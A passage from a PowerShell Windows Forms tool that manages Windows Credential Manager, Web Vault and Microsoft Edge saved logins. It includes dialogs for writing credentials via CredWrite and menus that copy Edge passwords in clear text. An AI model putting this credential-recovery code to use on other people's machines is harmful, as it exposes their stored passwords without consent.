$LV_WinCert.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_WinCert.SelectedIndices.Count -gt 0) { Clear-OtherSelections $LV_WinCert } } })
$LV_WinGen.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_WinGen.SelectedIndices.Count -gt 0) { Clear-OtherSelections $LV_WinGen } } })
$LV_EdgeTab.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_EdgeTab.SelectedIndices.Count -gt 0) { $Global:LastFocusedGrid = $LV_EdgeTab; Update-ButtonStates } else { Update-ButtonStates } } })
$LV_WinCreds.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_WinCreds.SelectedIndices.Count -gt 0) { Clear-DiagnosticSelections $LV_WinCreds } else { Update-ButtonStates } } })
$LV_PasswordVault.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_PasswordVault.SelectedIndices.Count -gt 0) { Clear-DiagnosticSelections $LV_PasswordVault } else { Update-ButtonStates } } })
$LV_EdgeDiagnostics.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_EdgeDiagnostics.SelectedIndices.Count -gt 0) { Clear-DiagnosticSelections $LV_EdgeDiagnostics } else { Update-ButtonStates } } })
$LV_VaultDecryption.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_VaultDecryption.SelectedIndices.Count -gt 0) { Clear-DiagnosticSelections $LV_VaultDecryption } else { Update-ButtonStates } } })
$LV_Vaultcmd.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_Vaultcmd.SelectedIndices.Count -gt 0) { Clear-DiagnosticSelections $LV_Vaultcmd } else { Update-ButtonStates } } })
$LV_ErrorLog.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_ErrorLog.SelectedIndices.Count -gt 0) { Clear-DiagnosticSelections $LV_ErrorLog } else { Update-ButtonStates } } })
$TxtEdgeTabFilter.Add_TextChanged({ Invoke-UiEventSafely { Update-EdgeTabList } })
$TxtEdgeFilter.Add_TextChanged({ Invoke-UiEventSafely { Update-EdgeDiagnosticsList } })

$TabControl.Add_SelectedIndexChanged({ 
    Invoke-UiEventSafely {
        if ($TabControl.SelectedIndex -eq 0) { $Global:LastFocusedGrid = $ListViewWeb }
        if ($TabControl.SelectedIndex -eq 1) { $Global:LastFocusedGrid = $LV_WinCore }
        if ($TabControl.SelectedIndex -eq 2) { $Global:LastFocusedGrid = $LV_EdgeTab }
        Update-ButtonStates
    }
})

# -------------------------------------------------------------
# 6. MODAL PROPERTY DIALOG WITH DYNAMIC LABEL CONTEXTS
# -------------------------------------------------------------
function Show-PropertyDialog ($SelectedObj, $TargetType) {
    $PropForm = New-Object System.Windows.Forms.Form
    $PropForm.Size = New-Object System.Drawing.Size(380, 310)
    $PropForm.StartPosition = "CenterParent"; $PropForm.FormBorderStyle = "FixedDialog"
    $PropForm.MaximizeBox = $False; $PropForm.MinimizeBox = $False
    $PropForm.Font = New-Object System.Drawing.Font("Segoe UI", 9)
    $PropForm.Text = if ($SelectedObj) { "Logon Information Properties" } else { "Add Stored Credential" }

    $startY = 17
    
    if (-not $SelectedObj -and $TargetType -ne "Web") {
        $lblType = New-Object System.Windows.Forms.Label; $lblType.Text = "Credential Type:"; $lblType.Location = New-Object System.Drawing.Point(15,20); $lblType.AutoSize = $True; $PropForm.Controls.Add($lblType)
        $cmbType = New-Object System.Windows.Forms.ComboBox; $cmbType.Location = New-Object System.Drawing.Point(145,17); $cmbType.Width = 190
        $cmbType.DropDownStyle = [System.Windows.Forms.ComboBoxStyle]::DropDownList
        [void]$cmbType.Items.Add("Windows Credential")
        [void]$cmbType.Items.Add("Certificate-Based Credential")
        [void]$cmbType.Items.Add("Generic Credential")
        $cmbType.SelectedIndex = switch ($TargetType) { "Windows_Cert" { 1 } "Windows_Gen" { 2 } default { 0 } }
        $PropForm.Controls.Add($cmbType)
        $startY = 52
    }

    $lblT = New-Object System.Windows.Forms.Label; $lblT.Text = "Log on to:"; $lblT.Location = New-Object System.Drawing.Point(15,$startY); $lblT.AutoSize = $True; $PropForm.Controls.Add($lblT)
    $txtT = New-Object System.Windows.Forms.TextBox; $txtT.Location = New-Object System.Drawing.Point(145,$startY); $txtT.Width = 190; $PropForm.Controls.Add($txtT)

    $lblU = New-Object System.Windows.Forms.Label; $lblU.Text = "User name:"; $lblU.Location = New-Object System.Drawing.Point(15,$($startY + 30)); $lblU.AutoSize = $True; $PropForm.Controls.Add($lblU)
    $txtU = New-Object System.Windows.Forms.TextBox; $txtU.Location = New-Object System.Drawing.Point(145,$($startY + 30)); $txtU.Width = 190; $PropForm.Controls.Add($txtU)

    $lblP = New-Object System.Windows.Forms.Label; $lblP.Text = "Password:"; $lblP.Location = New-Object System.Drawing.Point(15,$($startY + 60)); $lblP.AutoSize = $True; $PropForm.Controls.Add($lblP)
    $txtP = New-Object System.Windows.Forms.TextBox; $txtP.Location = New-Object System.Drawing.Point(145,$($startY + 60)); $txtP.Width = 150; $PropForm.Controls.Add($txtP)
    $txtP.UseSystemPasswordChar = $True

    $btnBrowseCertificate = New-Object System.Windows.Forms.Button
    $btnBrowseCertificate.Text = "Browse..."
    $btnBrowseCertificate.Location = New-Object System.Drawing.Point(300, $($startY + 58))
    $btnBrowseCertificate.Size = New-Object System.Drawing.Size(65, 24)
    $btnBrowseCertificate.Visible = $False
    $PropForm.Controls.Add($btnBrowseCertificate)

    $lblHelpContext = New-Object System.Windows.Forms.Label
    $lblHelpContext.Location = New-Object System.Drawing.Point(15, $($startY + 95))
    $lblHelpContext.Size = New-Object System.Drawing.Size(330, 55)
    $lblHelpContext.ForeColor = [System.Drawing.Color]::DimGray
    $lblHelpContext.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Italic)
    $PropForm.Controls.Add($lblHelpContext)

    $chkShowPassword = New-Object System.Windows.Forms.CheckBox
    $chkShowPassword.Text = "Show password / secret"
    $chkShowPassword.Location = New-Object System.Drawing.Point(145, $($startY + 85))
    $chkShowPassword.AutoSize = $True
    $PropForm.Controls.Add($chkShowPassword)

    $UpdateFieldLabels = {
        if ($TargetType -eq "Web") {
            $lblU.Text = "User name:"
            $lblP.Text = "Password:"
            $lblHelpContext.Text = "Web credentials allow clear text recovery following a Windows Security session challenge."
            $chkShowPassword.Text = "Show password"
            $chkShowPassword.Visible = $True
            $chkShowPassword.Checked = $False
            $btnBrowseCertificate.Visible = $False
            $txtP.Width = 150
            $txtP.UseSystemPasswordChar = $True
        } elseif ($cmbType) {
            switch ($cmbType.SelectedIndex) {
                0 {
                    $lblU.Text = "User name:"
                    $lblP.Text = "Password:"
                    $lblHelpContext.Text = "Make sure that the user name and password that you type can be used to access the location."
                    $chkShowPassword.Text = "Show password"
                    $chkShowPassword.Visible = $True
                    $chkShowPassword.Checked = $False
                    $btnBrowseCertificate.Visible = $False
                    $txtP.Width = 150
                    $txtP.UseSystemPasswordChar = $True
                }
                1 {
                    $lblU.Text = "User name:"
                    $lblP.Text = "Thumbprint:"
                    $lblHelpContext.Text = "Select a certificate from Current User > Personal or paste its SHA-1 thumbprint. The certificate must exist before this credential can be saved."
                    $chkShowPassword.Visible = $False
                    $chkShowPassword.Checked = $False
                    $btnBrowseCertificate.Visible = $True
                    $txtP.Width = 150
                    $txtP.UseSystemPasswordChar = $False
                }
                2 {
                    $lblU.Text = "User name:"
                    $lblP.Text = "Password:"
                    $lblHelpContext.Text = "Make sure that the user name and password that you type can be used to access the location."
                    $chkShowPassword.Text = "Show password"
                    $chkShowPassword.Visible = $True
                    $chkShowPassword.Checked = $False
                    $btnBrowseCertificate.Visible = $False
                    $txtP.Width = 150
                    $txtP.UseSystemPasswordChar = $True
                }
            }
        } elseif ($SelectedObj -and ([int]$SelectedObj.Type -eq 3 -or [int]$SelectedObj.Type -eq 5)) {
            $lblU.Text = "User name:"
            $lblP.Text = "Thumbprint:"
            $lblHelpContext.Text = "This credential stores a certificate hash. Use a certificate from Current User > Personal."
            $chkShowPassword.Visible = $False
            $chkShowPassword.Checked = $False
            $btnBrowseCertificate.Visible = $True
            $txtP.Width = 150
            $txtP.UseSystemPasswordChar = $False
        }
    }

    if ($cmbType) { $cmbType.Add_SelectedIndexChanged($UpdateFieldLabels) }

    $btnBrowseCertificate.Add_Click({
        $selectedThumbprint = Show-CertificatePickerDialog -Owner $PropForm
        if (-not [string]::IsNullOrWhiteSpace($selectedThumbprint)) {
            $txtP.Text = $selectedThumbprint
        }
    })

    $chkShowPassword.Add_CheckedChanged({
        if ($txtP.Text -eq "************") {
            [System.Windows.Forms.MessageBox]::Show("Windows strictly prevents the recovery or visualization of standard Windows Domain/Network passwords once saved.", "Security Restriction", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            $chkShowPassword.Checked = $false
            $txtP.UseSystemPasswordChar = $True
            return
        }

        $txtP.UseSystemPasswordChar = -not $chkShowPassword.Checked
        $txtP.Focus()
    })

    if ($SelectedObj) {
        $txtT.Text = $SelectedObj.Target; $txtT.ReadOnly = $True
        $txtU.Text = $SelectedObj.Username
        if ([string]::IsNullOrEmpty($SelectedObj.Password)) {
            $txtP.Text = "************"
        } else {
            $txtP.Text = $SelectedObj.Password
        }
    }

    &$UpdateFieldLabels

    $btnOK = New-Object System.Windows.Forms.Button; $btnOK.Text = "OK"; $btnOK.Location = New-Object System.Drawing.Point(180,230); $btnOK.Size = New-Object System.Drawing.Size(80,25); $PropForm.Controls.Add($btnOK)
    $btnCan = New-Object System.Windows.Forms.Button; $btnCan.Text = "Cancel"; $btnCan.Location = New-Object System.Drawing.Point(270,230); $btnCan.Size = New-Object System.Drawing.Size(80,25); $PropForm.Controls.Add($btnCan)

    $btnOK.Add_Click({
        $errors = New-Object System.Collections.Generic.List[string]
        $isCertificateCredential = if ($TargetType -ne "Web" -and $cmbType) { $cmbType.SelectedIndex -eq 1 } elseif ($SelectedObj) { ([int]$SelectedObj.Type -eq 3 -or [int]$SelectedObj.Type -eq 5) } else { $false }
        $normalizedThumbprint = $null
        $selectedCertificate = $null

        if ([string]::IsNullOrWhiteSpace($txtT.Text)) { [void]$errors.Add("- 'Server / Website' cannot be left blank.") }
        if ([string]::IsNullOrWhiteSpace($txtU.Text)) { [void]$errors.Add("- 'User name' cannot be left blank.") }
        if ($isCertificateCredential) {
            $normalizedThumbprint = Normalize-CertificateThumbprint $txtP.Text
            if ([string]::IsNullOrWhiteSpace($normalizedThumbprint)) {
                [void]$errors.Add("- Certificate-Based Credentials require a certificate from Current User > Personal or a SHA-1 thumbprint.")
            } elseif ($normalizedThumbprint.Length -ne 40) {
                [void]$errors.Add("- Certificate thumbprints must contain exactly 40 hexadecimal characters.")
            } elseif ([string]::IsNullOrWhiteSpace($txtU.Text)) {
                [void]$errors.Add("- Certificate-Based Credentials require the user name field to identify the associated account.")
            } else {
                $selectedCertificate = Find-CertificateCredential $normalizedThumbprint
                if ($null -eq $selectedCertificate) {
                    [void]$errors.Add("- The certificate thumbprint was not found in Current User > Personal.")
                } else {
                    $certificateUsability = Test-CertificateCredentialUsability $normalizedThumbprint
                    if (-not $certificateUsability.IsUsable) {
                        [void]$errors.Add("- $($certificateUsability.Message)")
                    }
                }
            }
        }

        if ($errors.Count -gt 0) {
            $errorMsg = "The information provided contains errors and cannot be saved:`n`n" + ($errors -join "`n")
            [System.Windows.Forms.MessageBox]::Show($errorMsg, "Malformed Data Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
            return
        }
        
        if ($TargetType -eq "Web") {
            try {
                $wCred = New-Object Windows.Security.Credentials.PasswordCredential($txtT.Text, $txtU.Text, $txtP.Text)
                $Vault.Add($wCred)
                $success = $true
            } catch { 
                [System.Windows.Forms.MessageBox]::Show("Windows Web Vault rejected this entry: " + $_.Exception.Message, "Vault Storage Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
                $success = $false 
            }
        } else {
            $nativeStruct = New-Object "SecurityEngineMatrix+CREDENTIAL"
            $credentialType = if ($SelectedObj) {
                [int]$SelectedObj.Type
            } else {
                switch ($cmbType.SelectedIndex) { 1 { 3 } 2 { 1 } default { 2 } }
            }

            if ($SelectedObj) {
                $nativeStruct.Type = [int]$SelectedObj.Type
            } else {
                $nativeStruct.Type = $credentialType
            }
            $nativeStruct.TargetName = $txtT.Text
            $nativeStruct.UserName = $txtU.Text
            $nativeStruct.Persist = 2 
            
            if ($SelectedObj -and $txtP.Text -eq "************" -and -not $isCertificateCredential) {
                $success = $true
            } else {
                if ($isCertificateCredential) {
                    $blobInfo = New-CertificateCredentialBlob -Thumbprint $normalizedThumbprint
                    $nativeStruct.CredentialBlob = $blobInfo.Pointer
                    $nativeStruct.CredentialBlobSize = $blobInfo.Size
                    $nativeStruct.UserName = [SecurityEngineMatrix]::MarshalCertificateUsername([byte[]]$blobInfo.HashBytes)
                    $nativeStruct.Comment = $txtU.Text
                    $txtP.Text = $blobInfo.Thumbprint
                } elseif (-not [string]::IsNullOrEmpty($txtP.Text)) {
                    $nativeStruct.CredentialBlob = [System.Runtime.InteropServices.Marshal]::StringToCoTaskMemUni($txtP.Text)
                    $nativeStruct.CredentialBlobSize = ($txtP.Text.Length * 2)
                } else {
                    $nativeStruct.CredentialBlob = [System.IntPtr]::Zero
                    $nativeStruct.CredentialBlobSize = 0
                }

                try {
                    $success = [SecurityEngineMatrix]::CredWrite([ref]$nativeStruct, 0)
                    if (-not $success) {
                        $errCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        $detail = Get-CredentialApiErrorDetail -ErrorCode $errCode -IsCertificateCredential $isCertificateCredential
                        [System.Windows.Forms.MessageBox]::Show("Windows Security Engine failed writing to LSA API.`n`n$detail", "API Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
                    }
                } catch {
                    [System.Windows.Forms.MessageBox]::Show("Fatal Win32 PInvoke Struct marshaling failure: " + $_.Exception.Message, "Runtime Exception", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
                    $success = $false
                } finally {
                    if ($nativeStruct.CredentialBlob -and $nativeStruct.CredentialBlob -ne [System.IntPtr]::Zero) {
                        [System.Runtime.InteropServices.Marshal]::FreeCoTaskMem($nativeStruct.CredentialBlob)
                    }
                }
            }
        }
        if ($success) { $PropForm.DialogResult = [System.Windows.Forms.DialogResult]::OK; $PropForm.Close() }
    })
    $btnCan.Add_Click({ $PropForm.Close() })
    return $PropForm.ShowDialog($MainForm)
}

# -------------------------------------------------------------
# 7. BUTTON MULTIPLEXER ROUTINES (UPDATED FOR VAULT)
# -------------------------------------------------------------
$BtnAdd.Add_Click({
    $activeType = "Windows_Core"
    if ($TabControl.SelectedIndex -eq 0) { $activeType = "Web" }
    elseif ($TabControl.SelectedIndex -eq 1) { 
        if ($Global:LastFocusedGrid -eq $LV_WinCert) { $activeType = "Windows_Cert" }
        elseif ($Global:LastFocusedGrid -eq $LV_WinGen) { $activeType = "Windows_Gen" }
        else { $activeType = "Windows_Core" }
    }
    elseif ($TabControl.SelectedIndex -eq 2) { 
        [System.Windows.Forms.MessageBox]::Show('Microsoft Edge credentials can be edited or removed from this tab, but creating new Edge logins is not exposed yet.', 'Microsoft Edge', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
        return
    }
    elseif ($TabControl.SelectedIndex -eq 3) { 
        # Diagnostics tab: use dedicated dialog
        if ((Show-VaultPropertyDialog $null) -eq [System.Windows.Forms.DialogResult]::OK) { Refresh-TabbedUI }
        return
    }
    if ((Show-PropertyDialog $Null $activeType) -eq [System.Windows.Forms.DialogResult]::OK) { Refresh-TabbedUI }
})

$BtnEdit.Add_Click({
    if ($Global:LastFocusedGrid.SelectedIndices.Count -eq 0) { return }
    $index = $Global:LastFocusedGrid.SelectedIndices[0]
    if ($Global:LastFocusedGrid -eq $ListViewWeb) { 
        $obj = $Global:WebCollection[$index]; $type = "Web"
        if ((Show-PropertyDialog $obj $type) -eq [System.Windows.Forms.DialogResult]::OK) { Refresh-TabbedUI }
    }
    elseif ($Global:LastFocusedGrid -eq $LV_WinCore) { 
        $obj = $Global:WinCoreColl[$index]; $type = "Windows_Core"
        if ((Show-PropertyDialog $obj $type) -eq [System.Windows.Forms.DialogResult]::OK) { Refresh-TabbedUI }
    }
    elseif ($Global:LastFocusedGrid -eq $LV_WinCert) { 
        $obj = $Global:WinCertColl[$index]; $type = "Windows_Cert"
        if ((Show-PropertyDialog $obj $type) -eq [System.Windows.Forms.DialogResult]::OK) { Refresh-TabbedUI }
    }
    elseif ($Global:LastFocusedGrid -eq $LV_WinGen) {
        $obj = $Global:WinGenColl[$index]; $type = "Windows_Gen"
        if ((Show-PropertyDialog $obj $type) -eq [System.Windows.Forms.DialogResult]::OK) { Refresh-TabbedUI }
    }
    elseif ($Global:LastFocusedGrid -eq $LV_EdgeTab) {
        $obj = Get-SelectedEdgeTabRow
        if ($null -eq $obj) { return }
        if (-not (Test-EdgeWritePreconditions -ActionVerb 'updated' -SelectedRow $obj)) { return }

        $editedValues = Show-EdgePropertyDialog -SelectedObj $obj
        if ($null -eq $editedValues) { return }

        try {
            [EdgeDiagnosticsEngine]::UpdateCredential([int64]$obj.LoginId, [string]$obj.ProfilePath, [string]$editedValues.Username, [string]$editedValues.Password)
            Refresh-TabbedUI
            [System.Windows.Forms.MessageBox]::Show('The selected Edge credential was updated successfully.', 'Microsoft Edge', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
        } catch {
            [System.Windows.Forms.MessageBox]::Show("Failed to update the selected Edge credential.`n`n$_", 'Microsoft Edge', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
        }
    }
    elseif ($Global:LastFocusedGrid -eq $LV_EdgeDiagnostics) {
        $obj = Get-SelectedEdgeDiagnosticRow
        if ($null -eq $obj) { return }
        if (-not (Test-EdgeWritePreconditions -ActionVerb 'updated' -SelectedRow $obj)) { return }

        $editedValues = Show-EdgePropertyDialog -SelectedObj $obj
        if ($null -eq $editedValues) { return }

        try {
            [EdgeDiagnosticsEngine]::UpdateCredential([int64]$obj.LoginId, [string]$obj.ProfilePath, [string]$editedValues.Username, [string]$editedValues.Password)
            Refresh-TabbedUI
            [System.Windows.Forms.MessageBox]::Show('The selected Edge credential was updated successfully.', 'Edge Diagnostics', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
        } catch {
            [System.Windows.Forms.MessageBox]::Show("Failed to update the selected Edge credential.`n`n$_", 'Edge Diagnostics', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
        }
    }
})

$BtnRemove.Add_Click({
    if ($Global:LastFocusedGrid.SelectedIndices.Count -eq 0) { return }
    $index = $Global:LastFocusedGrid.SelectedIndices[0]
    if ($Global:LastFocusedGrid -eq $ListViewWeb) {
        $obj = $Global:WebCollection[$index]
        if (([System.Windows.Forms.MessageBox]::Show("Remove Web Identity matching '$($obj.Target)'?", "Confirm Removal", [System.Windows.Forms.MessageBoxButtons]::YesNo)) -eq "Yes") {
            $wCred = New-Object Windows.Security.Credentials.PasswordCredential($obj.Target, $obj.Username, $obj.Password)
            $Vault.Remove($wCred)
        }
    } elseif ($Global:LastFocusedGrid -eq $LV_WinCore) {
        $obj = $Global:WinCoreColl[$index]
        if (([System.Windows.Forms.MessageBox]::Show("Remove Windows Identity matching '$($obj.Target)'?", "Confirm Removal", [System.Windows.Forms.MessageBoxButtons]::YesNo)) -eq "Yes") {
            [void](Remove-CrdCredential -TargetName $obj.Target -Type ([uint32]$obj.Type))
        }
    } elseif ($Global:LastFocusedGrid -eq $LV_WinCert) {
        $obj = $Global:WinCertColl[$index]
        if (([System.Windows.Forms.MessageBox]::Show("Remove Certificate Identity matching '$($obj.Target)'?", "Confirm Removal", [System.Windows.Forms.MessageBoxButtons]::YesNo)) -eq "Yes") {
            [void](Remove-CrdCredential -TargetName $obj.Target -Type ([uint32]$obj.Type))
        }
    } elseif ($Global:LastFocusedGrid -eq $LV_WinGen) {
        $obj = $Global:WinGenColl[$index]
        if (([System.Windows.Forms.MessageBox]::Show("Remove Generic Identity matching '$($obj.Target)'?", "Confirm Removal", [System.Windows.Forms.MessageBoxButtons]::YesNo)) -eq "Yes") {
            [void](Remove-CrdCredential -TargetName $obj.Target -Type ([uint32]$obj.Type))
        }
    } elseif ($Global:LastFocusedGrid -eq $LV_EdgeTab) {
        $obj = Get-SelectedEdgeTabRow
        if ($null -eq $obj) { return }
        if (-not (Test-EdgeWritePreconditions -ActionVerb 'deleted' -SelectedRow $obj)) { return }

        $confirm = [System.Windows.Forms.MessageBox]::Show("Remove the Edge credential for '$($obj.Website)' in profile '$($obj.ProfileName)'?`n`nThis cannot be undone.", 'Confirm Edge Removal', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
        if ($confirm -eq [System.Windows.Forms.DialogResult]::Yes) {
            try {
                [EdgeDiagnosticsEngine]::DeleteCredential([int64]$obj.LoginId, [string]$obj.ProfilePath)
                Refresh-TabbedUI
                [System.Windows.Forms.MessageBox]::Show('The selected Edge credential was removed successfully.', 'Microsoft Edge', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            } catch {
                [System.Windows.Forms.MessageBox]::Show("Failed to remove the selected Edge credential.`n`n$_", 'Microsoft Edge', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            }
        }
    } elseif ($Global:LastFocusedGrid -eq $LV_EdgeDiagnostics) {
        $obj = Get-SelectedEdgeDiagnosticRow
        if ($null -eq $obj) { return }
        if (-not (Test-EdgeWritePreconditions -ActionVerb 'deleted' -SelectedRow $obj)) { return }

        $confirm = [System.Windows.Forms.MessageBox]::Show("Remove the Edge credential for '$($obj.Website)' in profile '$($obj.ProfileName)'?`n`nThis cannot be undone.", 'Confirm Edge Removal', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
        if ($confirm -eq [System.Windows.Forms.DialogResult]::Yes) {
            try {
                [EdgeDiagnosticsEngine]::DeleteCredential([int64]$obj.LoginId, [string]$obj.ProfilePath)
                Refresh-TabbedUI
                [System.Windows.Forms.MessageBox]::Show('The selected Edge credential was removed successfully.', 'Edge Diagnostics', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            } catch {
                [System.Windows.Forms.MessageBox]::Show("Failed to remove the selected Edge credential.`n`n$_", 'Edge Diagnostics', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            }
        }
    }
    Refresh-TabbedUI
})

# ===================================================================
# 8. COPY-TO-CLIPBOARD FUNCTIONALITY FOR DIAGNOSTICS
# ===================================================================

function Copy-ListViewItemToClipboard {
    param(
        [System.Windows.Forms.ListView]$ListView,
        [bool]$AllColumns = $false
    )

    if ($ListView.SelectedIndices.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("No item selected", "Copy", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
        return
    }

    $selectedIndex = $ListView.SelectedIndices[0]
    $item = $ListView.Items[$selectedIndex]

    if ($AllColumns) {
        # Copy all columns as tab-separated
        $text = $item.Text
        foreach ($subItem in $item.SubItems) {
            if ($subItem -ne $item) {
                $text += "`t" + $subItem.Text
            }
        }
    } else {
        # Copy only first column (Text)
        $text = $item.Text
    }

    try {
        if (-not [string]::IsNullOrEmpty($text)) {
            [System.Windows.Forms.Clipboard]::SetText($text)
            [System.Windows.Forms.MessageBox]::Show("Copied to clipboard:`n`n$text", "Copy Successful", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
        } else {
            [System.Windows.Forms.MessageBox]::Show("Selected item is empty", "Nothing to Copy", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Failed to copy to clipboard: $_", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
    }
}

function Add-ListViewContextMenu {
    param(
        [System.Windows.Forms.ListView]$ListView,
        [string]$ListViewName
    )

    # Create context menu
    $contextMenu = New-Object System.Windows.Forms.ContextMenuStrip

    if ($ListViewName -eq 'EdgeDiagnostics') {
        foreach ($edgeCopySpec in @(
            @{ Text = 'Copy Website'; SubItemIndex = 1 },
            @{ Text = 'Copy Username'; SubItemIndex = 2 },
            @{ Text = 'Copy Password'; SubItemIndex = 3 }
        )) {
            $edgeCopyMenu = New-Object System.Windows.Forms.ToolStripMenuItem
            $edgeCopyMenu.Text = $edgeCopySpec.Text
            $subItemIndex = [int]$edgeCopySpec.SubItemIndex
            $edgeCopyMenu.Add_Click({
                try {
                    $lv = $this.Owner.SourceControl
                    if ($null -eq $lv -or $lv.SelectedIndices.Count -eq 0) {
                        [System.Windows.Forms.MessageBox]::Show('No item selected', 'Copy', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                        return
                    }

                    $item = $lv.Items[$lv.SelectedIndices[0]]
                    if ($item.SubItems.Count -le $subItemIndex) {
                        [System.Windows.Forms.MessageBox]::Show('The selected item does not contain that field.', 'Copy', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
                        return
                    }

                    $text = $item.SubItems[$subItemIndex].Text
                    if (-not [string]::IsNullOrEmpty($text)) {
                        [System.Windows.Forms.Clipboard]::SetText($text)
                        [System.Windows.Forms.MessageBox]::Show("Copied to clipboard:`n`n$text", 'Copy Successful', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                    } else {
                        [System.Windows.Forms.MessageBox]::Show('Selected field is empty', 'Nothing to Copy', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
                    }
                }
                catch {
                    [System.Windows.Forms.MessageBox]::Show("Copy error: $_", 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
                }
            }.GetNewClosure())
            [void]$contextMenu.Items.Add($edgeCopyMenu)
        }

        [void]$contextMenu.Items.Add((New-Object System.Windows.Forms.ToolStripSeparator))
    }

    $copyItemMenu = New-Object System.Windows.Forms.ToolStripMenuItem
    $copyItemMenu.Text = "Copy Item (First Column)"
    $copyItemMenu.Add_Click({
        try {
            $lv = $this.Owner.SourceControl
            if ($lv.SelectedIndices.Count -eq 0) {
                [System.Windows.Forms.MessageBox]::Show("No item selected", "Copy", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                return
            }
            $selectedIndex = $lv.SelectedIndices[0]
            $item = $lv.Items[$selectedIndex]
            $text = $item.Text
            if (-not [string]::IsNullOrEmpty($text)) {
                [System.Windows.Forms.Clipboard]::SetText($text)
                [System.Windows.Forms.MessageBox]::Show("Copied to clipboard:`n`n$text", "Copy Successful", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            }
        }
        catch { [System.Windows.Forms.MessageBox]::Show("Copy error: $_", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null }
    })
    [void]$contextMenu.Items.Add($copyItemMenu)

    $copyAllMenu = New-Object System.Windows.Forms.ToolStripMenuItem
    $copyAllMenu.Text = "Copy Item (All Columns)"
    $copyAllMenu.Add_Click({
        try {
            $lv = $this.Owner.SourceControl
            if ($lv.SelectedIndices.Count -eq 0) {
                [System.Windows.Forms.MessageBox]::Show("No item selected", "Copy", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                return
            }
            $selectedIndex = $lv.SelectedIndices[0]
            $item = $lv.Items[$selectedIndex]
            $text = $item.Text
            foreach ($subItem in $item.SubItems) {
                if ($subItem -ne $item) {
                    $text += "`t" + $subItem.Text
                }
            }
            if (-not [string]::IsNullOrEmpty($text)) {
                [System.Windows.Forms.Clipboard]::SetText($text)
                [System.Windows.Forms.MessageBox]::Show("Copied to clipboard:`n`n$text", "Copy Successful", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
            }
        }
        catch { [System.Windows.Forms.MessageBox]::Show("Copy error: $_", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null }
    })
    [void]$contextMenu.Items.Add($copyAllMenu)

    [void]$contextMenu.Items.Add((New-Object System.Windows.Forms.ToolStripSeparator))

    $copyColumnHeadersMenu = New-Object System.Windows.Forms.ToolStripMenuItem
    $copyColumnHeadersMenu.Text = "Copy All Column Headers"
    $copyColumnHeadersMenu.Add_Click({
        try {
            $lv = $this.Owner.SourceControl
            $headers = @()
            foreach ($col in $lv.Columns) {
                $headers += $col.Text
            }
            $text = $headers -join "`t"
